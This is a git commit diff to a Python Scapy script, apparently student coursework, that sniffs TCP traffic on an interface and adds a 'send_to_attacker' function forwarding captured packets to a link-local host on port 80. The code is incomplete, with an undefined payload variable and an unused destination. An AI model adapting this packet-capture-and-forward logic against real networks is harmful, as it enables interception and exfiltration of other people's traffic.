5e0416e7a3edebca5433d623a6cb936cb755c4e3
Chris <christopherparks@nevada.unr.edu>
2021-04-07 19:47:11 -0400

    Begin to Implement Router

--- sniffer.py
+++ sniffer.py
@@ -9,29 +9,24 @@ from copy import deepcopy
 packets = []
 
 def packet_sniffer():
+    local_ip = get_if_addr('eth1')
     print('Calling packet sniffer function.')
-    pkt = sniff(filter='tcp', count=5, iface='eth1', prn=packet_storage)
+    pkt = sniff(filter='host ' + local_ip + ' and tcp', count=5, iface='eth1', prn=packet_storage)
 
 def packet_storage(packet):
     packets.append(packet)
 
-def send_back():
-    x = 50
-    y = 5001
+def send_to_attacker():
+    actual_destination = '169.254.0.7'
     for packet in packets:
-        new_packet = IP()/TCP()
-        new_packet[IP].dst = packet[IP].src
-        new_packet[IP].src = packet[IP].dst
-
-        new_packet[TCP].sport = y
-        new_packet[TCP].dport = x
-
-        x += 10
-        y += 10
+        new_packet = IP()/TCP()/Raw(load=data)
+        new_packet[IP].dst = '169.254.0.10'
+    
+        new_packet[TCP].dport = 80
 
         print('new_packet:', new_packet.show())
 
-        r1 = sr1(new_packet, timeout=2)
+        r1 = sr1(new_packet, timeout=5)
         
 
 def print_packets():
@@ -42,5 +37,5 @@ def print_packets():
 if __name__=='__main__':
     packet_sniffer()
     print_packets()
-    send_back()
+    send_to_attacker()
     
